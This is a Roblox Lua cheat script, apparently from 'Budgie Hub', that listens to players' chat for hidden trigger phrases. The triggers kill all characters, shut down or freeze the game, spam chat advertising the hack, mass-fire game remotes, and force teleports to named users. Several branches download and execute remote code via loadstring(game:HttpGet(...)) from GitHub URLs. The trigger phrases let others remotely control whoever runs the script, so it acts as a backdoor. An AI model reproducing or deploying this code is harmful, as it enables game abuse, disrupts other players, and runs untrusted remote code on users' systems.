function onChatMessage(player, message)
   if message:lower() == "killalladminbattlegrounds" then
      local function getAllPlayers()
         local players = game:GetService("Players"):GetPlayers()
         return players
      end
      local allPlayers = getAllPlayers()
      for _, p in ipairs(allPlayers) do
         if p.Character then
            p.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
         end
      end
   elseif message:lower() == "kickalladminbattlegrounds" then
      game:Shutdown()
   elseif message:lower() == "findadminbattlegrounds" then
      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
         "I'm using Budgie Hub | Best hack/script for KJ Arena",
         "All"
      )
   elseif message:lower() == "reinjectadminbattlegrounds" then
      local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
      OrionLib:Destroy()
      wait(1)
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Wolfdmitrich/gojovstoji/main/main.lua"))()
   elseif message:lower() == "findtonotbadadminbattlegrounds" then
      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(",//./.", "All")
   elseif message:lower() == "crashalladminbattlegrounds" then
      while true do
      end
   elseif message:lower() == "rejoinalladminbattlegrounds" then
      TeleportService = game:GetService("TeleportService")
      TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
   elseif message:lower() == "serverhopalladminbattlegrounds" then
      local module =
         loadstring(game:HttpGet "https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
      module:Teleport(game.PlaceId)
   elseif message:lower() == "getadmintoolsalladminbattlegrounds" then
      local tool = Instance.new("Tool")
      tool.Name = "ꙮ"
      tool.RequiresHandle = false

      tool.Activated:Connect(
         function()
            for i = 1, 135 do
               local ohString1 = "Groundslash"

               game:GetService("ReplicatedStorage").Sukuna2.BeowulfRemote:FireServer(ohString1)
            end
         end
      )

      tool.Parent = game.Players.LocalPlayer.Backpack

      local tool = Instance.new("Tool")
      tool.Name =
         "Ů̵̖͘͡͠͞͝l̴̢̡̫̏́͡͞ţ̵̷̵̶̯̎̕r̷̶̶͈̊͝͞͝ạ̢̡ͫ́͟͜͡ ̸̴̧̟̋͠͞͡B̷̧̗̈́͘͢͟͝ě̢̳̀͏̷̨͡a̶̢̼̍͘͘͠͞t̛͍ͧ͘͏̛́͘d̷͇͑҉̷͜͢͡ơ̤͆̀͟҉̷͞ẁ̶̯͝͏̛̀͏ň̯͢҉̸̡͟͠"
      tool.RequiresHandle = false

      tool.Activated:Connect(
         function()
            for i = 1, 100 do
               game:GetService("ReplicatedStorage")["Reworked Gojo Assets"].Remotes.Beatdown:FireServer()
            end
            wait(1)
            for i = 1, 3 do
               game:GetService("ReplicatedStorage").FullKJAssetsForUpdate["KJ Remotes"].Series:FireServer()
            end
         end
      )

      tool.Parent = game.Players.LocalPlayer.Backpack

      local tool = Instance.new("Tool")
      tool.Name = "💣︎🖐︎☼︎🏳︎✞︎✡︎☜︎ 🏱︎🏳︎☼︎☜︎☪︎✡︎"
      tool.RequiresHandle = false

      tool.Activated:Connect(
         function()
            for i = 1, 200 do
               local ohString1 = "HellOnEarth3"
               game:GetService("ReplicatedStorage").Sukuna2.BeowulfRemote:FireServer(ohString1)
            end
         end
      )

      tool.Parent = game.Players.LocalPlayer.Backpack
   elseif message:lower() == "copymessageadminbattlegrounds" then
      setclipboard("God is here!!!")
   elseif message:lower() == "spawnpartalladminbattlegrounds" then
      part1 = Instance.new("Part")
      part1.Name = "Part1"
      part1.Size = Vector3.new(10, 10, 10)
      part1.Transparency = 0
      part1.Anchored = false
      part1.Position =
         game.Players.LocalPlayer.Character.HumanoidRootPart.Position +
         Vector3.new(math.random(-20, 20), 0, math.random(-20, 20))
      part1.BrickColor = BrickColor.new(Color3.new(0, 80, 0))
      part1.Material = Enum.Material.Neon
      part1.Parent = game.Workspace

      local pointLight = Instance.new("PointLight")
      pointLight.Name = "NeonLight"
      pointLight.Brightness = 20
      pointLight.Range = 50
      pointLight.Color = Color3.fromRGB(0, 80, 0)
      pointLight.Parent = part1
   elseif message:lower() == "punishalladminbattlegrounds" then
      game.Players.LocalPlayer.Character:Destroy()
   elseif message:lower() == "basicmodeladminbattlegrounds" then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BasicModel/main/Test"))()
   elseif message:lower() == "bigmodeladminbattlegrounds" then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BigModel/main/Test"))()
   elseif message:lower() == "noguialladminbattlegrounds" then
      local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
   elseif message:lower() == "titanmodeladminbattlegrounds" then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/TitanModel/main/Test"))()
   elseif message:lower() == "fakemessageinfoadminbattlegrounds" then
      loadstring(
         game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Fake-message-info/main/SukunaBattlegrounds")
      )()
   elseif message:lower() == "budgiealladminbattlegrounds" then
      Spooky = Instance.new("Sound", game.Workspace)
      Spooky.Name = "Spooky"
      Spooky.SoundId = "rbxassetid://1494570444"
      Spooky.Volume = 3
      Spooky.PlaybackSpeed = 1
      Spooky.Looped = false
      Spooky:Play()

      wait(4.1)
      s = Instance.new("Sky")
      s.Name = "SKY"
      s.SkyboxBk = "http://www.roblox.com/asset/?id=16336200609"
      s.SkyboxDn = "http://www.roblox.com/asset/?id=16336200609"
      s.SkyboxFt = "http://www.roblox.com/asset/?id=16336200609"
      s.SkyboxLf = "http://www.roblox.com/asset/?id=16336200609"
      s.SkyboxRt = "http://www.roblox.com/asset/?id=16336200609"
      s.SkyboxUp = "http://www.roblox.com/asset/?id=16336200609"
      s.Parent = game.Lighting

      decalID = 16336200609
      function exPro(root)
         for _, v in pairs(root:GetChildren()) do
            if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=" .. decalID then
               v.Parent = nil
            elseif v:IsA("BasePart") then
               v.Material = "Plastic"
               v.Transparency = 0
               local One = Instance.new("Decal", v)
               local Two = Instance.new("Decal", v)
               local Three = Instance.new("Decal", v)
               local Four = Instance.new("Decal", v)
               local Five = Instance.new("Decal", v)
               local Six = Instance.new("Decal", v)
               One.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               Two.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               Three.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               Four.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               Five.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               Six.Texture = "http://www.roblox.com/asset/?id=" .. decalID
               One.Face = "Front"
               Two.Face = "Back"
               Three.Face = "Right"
               Four.Face = "Left"
               Five.Face = "Top"
               Six.Face = "Bottom"
            end
            exPro(v)
         end
      end
      function asdf(root)
         for _, v in pairs(root:GetChildren()) do
            asdf(v)
         end
      end
      exPro(game.Workspace)
      asdf(game.Workspace)
   elseif message:lower() == "fastenalladminbattlegrounds" then
      local player = game.Players.LocalPlayer
      local character = player.Character or player.CharacterAdded:Wait()
      local humanoid = character:FindFirstChild("Humanoid")

      if humanoid then
         humanoid.PlatformStand = true
      end
   elseif message:lower() == "fakeplayeradminbattlegrounds" then
      local newPlayer = Instance.new("Player")
      newPlayer.Name = "Error loading model"
      newPlayer.CharacterAppearance = "http://www.roblox.com/asset/?id=123456789"
      newPlayer.Parent = game.Players
   elseif message:lower() == "deletealltoolsalladminbattlegrounds" then
      local Player = game:GetService("Players").LocalPlayer
      local Backpack = Player.Backpack
      local Character = Player.Character

      for _, v in pairs(Backpack:GetChildren()) do
         if v:IsA("Tool") or v:IsA("HopperBin") then
            v:Destroy()
         end
      end

      for _, v in pairs(Character:GetChildren()) do
         if v:IsA("Tool") or v:IsA("HopperBin") then
            v:Destroy()
         end
      end
   elseif message:lower() == "tposealladminbattlegrounds" then
      local Anim = Instance.new("Animation")
      Anim.AnimationId = "rbxassetid://27432691"
      local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
      k:Play()
      k:AdjustSpeed(4)
      wait(1)
      k:AdjustSpeed(0)
   elseif message:lower() == "zeromassalladminbattlegrounds" then
      local plr = game.Players.LocalPlayer
      local char = plr.Character
      for _, child in pairs(char:GetChildren()) do
         if child:IsA("BasePart") then
            child.Massless = false
            child.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
         end
      end
   elseif message:lower() == "breakzoomalladminbattlegrounds" then
      local plr = game.Players.LocalPlayer
      plr.CameraMaxZoomDistance = 0
      plr.CameraMinZoomDistance = 0
   elseif message:lower() == "explodealladminbattlegrounds" then
      local explosionRadius = 3
      local position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
      local explosion = Instance.new("Explosion")
      explosion.Position = position
      explosion.BlastRadius = explosionRadius
      explosion.Parent = workspace
   elseif message:lower() == "hamsterovichbringalladminbattlegrounds" then
      player = game.Players.LocalPlayer
      local Hamsterovich = game.Players:FindFirstChild("Hamsterovich")
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
            game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
            elseif message:lower() == "wolfdmitrichbringalladminbattlegrounds" then
      player = game.Players.LocalPlayer
      local Hamsterovich = game.Players:FindFirstChild("Wolfdmitrich")
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
         game.Players.Wolfdmitrich.Character.HumanoidRootPart.CFrame
   elseif message:lower() == "adskerbringalladminbattlegrounds" then
      player = game.Players.LocalPlayer
      local Hamsterovich = game.Players:FindFirstChild("ADSKerX")
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
            game.Players.ADSKerX.Character.HumanoidRootPart.CFrame
            elseif message:lower() == "megacoconutbringalladminbattlegrounds" then
      player = game.Players.LocalPlayer
      local Hamsterovich = game.Players:FindFirstChild("MEGACOCONUT")
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
         game.Players.MEGACOCONUT.Character.HumanoidRootPart.CFrame
   elseif message:lower() == "scarytwoalladminbattlegrounds" then
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/scary/main/file"))()
   elseif message:lower() == "jailalladminbattlegrounds" then
      local function getAllPlayers()
         local players = game:GetService("Players"):GetPlayers()
         return players
      end
      local allPlayers = getAllPlayers()
      for _, p in ipairs(allPlayers) do
         if p.Character then
            p.Character:MoveTo(Vector3.new(-1279, 33, 3))
         end
      end
   elseif message:lower() == "warnadminbattlegrounds" then
      local Fg = math.random(1, 2)
      local iconId = (Fg == 1) and "17763697573" or "16336200609"
      game.StarterGui:SetCore(
         "SendNotification",
         {
            Title = "Budgie Hub",
            Text = "On this server the developer of Budgie Hub",
            Icon = "rbxassetid://" .. iconId,
            Duration = 5
         }
      )
   elseif message:lower() == "scaryalladminbattlegrounds" then
      local co = Instance.new("ColorCorrectionEffect")
      co.Parent = game.Lighting
      co.Saturation = 150
      co.TintColor = Color3.fromRGB(255, 0, 0)

      local Spooky = Instance.new("Sound", game.Workspace)
      Spooky.Name = "Spooky"
      Spooky.SoundId = "rbxassetid://6302642278"
      Spooky.Volume = 3
      Spooky.PlaybackSpeed = 0.9
      Spooky.Looped = true
      Spooky:Play()

      for _, v in ipairs(game.Workspace:GetChildren()) do
         if v:IsA("BasePart") then
            for i = 1, 6 do
               local decal = Instance.new("Decal")
               decal.Texture = "http://www.roblox.com/asset/?id=7057923071"
               decal.Parent = v
               decal.Face = Enum.NormalId[i]
            end
         end
      end

      for _, v in ipairs(game.Workspace:GetChildren()) do
         if v:IsA("Model") then
            for _, z in ipairs(v:GetChildren()) do
               if z:IsA("BasePart") then
                  for i = 1, 6 do
                     local decal = Instance.new("Decal")
                     decal.Texture = "http://www.roblox.com/asset/?id=7057923071"
                     decal.Parent = z
                     decal.Face = Enum.NormalId[i]
                  end
               end
            end
            for _ = 1, 20 do
               wait(10)
               loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/NextBot/main/NextBot"))()
            end
         end
      end
   elseif message:lower() == "screamalladminbattlegrounds" then
      for i = 1, 10 do
         local jumpscareSound = Instance.new("Sound", workspace)
         jumpscareSound.Name = "JumpscareSound"
         jumpscareSound.Volume = 10
         jumpscareSound.Pitch = 0.9
         jumpscareSound.SoundId = "rbxassetid://5029269312"

         local jumpscareGUI = Instance.new("ScreenGui", nil)
         jumpscareGUI.Name = "Jumpscare"
         local image = Instance.new("ImageLabel", jumpscareGUI)
         image.Name = "JumpscareImage"
         image.BackgroundColor3 = Color3.new(0, 0, 0)
         image.BorderColor3 = Color3.new(255, 255, 255)
         image.BorderSizePixel = 0
         image.Size = UDim2.new(1.05, 0, 1.17, 0)
         image.Image = "rbxassetid://1119705746"
         image.Active = true
         image.Position = UDim2.new(0, 0, -0.13, 0)

         for i, c in pairs(game.Players:GetChildren()) do
            local jumpscareClone = jumpscareGUI:Clone()
            jumpscareClone.Parent = c.PlayerGui
         end
         jumpscareSound:Play()
      end
   end
end

function onPlayerAdded(player)
   player.Chatted:Connect(
      function(message)
         onChatMessage(player, message)
      end
   )
end

game.Players.PlayerAdded:Connect(onPlayerAdded)

for _, player in ipairs(game.Players:GetPlayers()) do
   onPlayerAdded(player)
end
